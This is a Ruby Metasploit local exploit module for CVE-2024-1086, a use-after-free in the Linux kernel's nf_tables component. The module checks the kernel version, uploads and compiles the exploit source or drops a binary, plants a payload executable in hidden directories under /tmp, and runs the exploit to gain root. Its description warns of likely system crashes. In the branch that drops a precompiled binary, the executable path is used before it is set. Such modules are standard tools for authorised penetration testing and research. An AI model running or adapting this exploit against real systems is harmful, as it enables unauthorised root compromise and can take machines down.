##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ManualRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Post::Linux::Compile
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Netfilter nf_tables Linux Priv Esc',
        'Description' => %q{
          A use-after-free vulnerability in the Linux kernels netfilter: nf_tables component can be
          exploited to achieve local privilege escalation. The nft_verdict_init() function allows
          positive values as drop error within the hook verdict, and hence the nf_hook_slow() function
          can cause a double free vulnerability when NF_DROP is issued with a drop error which
          resembles NF_ACCEPT.

          Devices with a WiFi interface will likely be unstable with this exploit and crash.

          Successful exploitation will likely crash the original shell.

          Failed exploitation will likely HARD crash the system or put it into an unreliable state
          and it will need a physical reset/reboot. Attempted re-exploitation without a reboot will
          hard crash the system.

          Tested against a VM of Ubuntu 22.04 (Linux 5.15.0-60-generic)
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Notselwyn' # original PoC
        ],
        'Platform' => [ 'linux' ],
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Targets' => [[ 'Auto', {} ]],
        'Privileged' => true,
        'References' => [
          [ 'URL', 'https://pwning.tech/nftables/'],
          [ 'URL', 'https://github.com/Notselwyn/CVE-2024-1086'],
          [ 'CVE', '2024-1086']
        ],
        'DefaultOptions' => {
          # without these the system seems to hard crash in 2-6min
          # with these i've had both shells and the system stable for over an hour
          'PrependMigrate' => true,
          'PrependFork' => true
        },
        'DisclosureDate' => '2024-01-31',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_OS_DOWN],
          'Reliability' => [UNRELIABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, SCREEN_EFFECTS]
        }
      )
    )
    register_advanced_options [
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
    ]
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def check
    # there is likely backporting going on per distro as well
    release = kernel_release
    if (
      Rex::Version.new(release.split('-').first) >= Rex::Version.new('5.15.0') &&
      Rex::Version.new(release.split('-').first) < Rex::Version.new('6.0')
    ) ||
       (
        Rex::Version.new(release.split('-').first) < Rex::Version.new('6.6') &&
        Rex::Version.new(release.split('-').first) >= Rex::Version.new('6.0')
      )
      return CheckCode::Appears("Kernel version #{release} appears to be vulnerable")
    end

    CheckCode::Safe("Kernel version #{release} is not vulnerable")
  end

  def check_musl_tools?
    lib = cmd_exec('dpkg --get-selections | grep musl-tools')
    if lib.include?('musl-tools')
      vprint_good('musl-tools is installed')
      return true
    else
      print_error('musl-tools is not installed.  Compiling will fail.')
    end
    false
  end

  def exploit
    if !datastore['ForceExploit'] && is_root?
      fail_with Failure::None, 'Session already has root privileges. Set ForceExploit to override'
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    nested_base = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
    print_status("Creating #{nested_base}")
    mkdir nested_base
    register_dirs_for_cleanup(nested_base)

    if live_compile? &&
       check_musl_tools? &&
       (command_exists?('unzip') || command_exists?('python3'))
      print_status 'Creating upload zip'
      zip = Rex::Zip::Archive.new
      # zip the entire exploit source
      exploit_folder = ::File.join(::Msf::Config.data_directory, 'exploits', 'CVE-2024-1086')
      exploit_path = ".#{rand_text_alphanumeric(5..10)}"
      Dir.glob("#{exploit_folder}/**/*").each do |file|
        # avoid .md files
        next if File.extname(file) == '.md' || !File.file?(file) || file == 'LICENSE'

        file_contents = File.read(file)

        file_contents.gsub!('OUT_NAME = ./exploit', "OUT_NAME = ./#{exploit_path}") if file.include? 'Makefile'

        # Add each file to the archive with its relative path
        zip.add_file(file.split('CVE-2024-1086/')[1], file_contents)
      end
      print_status('Finished creating exploit source zip, uploading...')
      zip_path = "#{nested_base}/.#{rand_text_alphanumeric(5..10)}.zip"
      write_file(zip_path, zip.pack)
      print_status('Unzipping exploit code on remote system')
      # if unzip
      # cmd_exec "cd #{nested_base}; pwd; unzip exploit.zip"
      # if python3
      if command_exists?('python3')
        cmd_exec "python3 -m zipfile -e #{zip_path} #{nested_base}"
      else
        cmd_exec "unzip #{zip_path} -d #{nested_base}"
      end
      print_status('Compiling')
      cmd_exec "cd #{nested_base}; make"
      executable_path = "#{nested_base}/exploit"
    else
      vprint_status 'Dropping pre-compiled exploit on system...'
      upload_and_chmodx executable_path, exploit_data('example')
    end

    # Upload payload executable
    payload_path = "#{nested_base}/.#{rand_text_alphanumeric(5..10)}"
    print_status("Uploading payload executable to #{payload_path}")
    upload_and_chmodx payload_path, generate_payload_exe

    # Launch exploit with a timeout.  We also have a vprint_status so if the user wants all the
    # output from the exploit being run, they can optionally see it
    timeout = 60
    print_status 'Launching exploit... (may take a few minutes)'
    # this is the original line we typically use, but exiting from the shell brougth on
    # by the exploit causes the system to possibly become unstable. We also use a migrate
    # and prepend fork for overall system stability.
    # output = cmd_exec "echo '#{payload_path} & exit' | #{executable_path}", nil, timeout

    output = cmd_exec "echo '#{payload_path}' | #{executable_path}", nil, timeout
    output.each_line { |line| vprint_status line.chomp }
  end
end
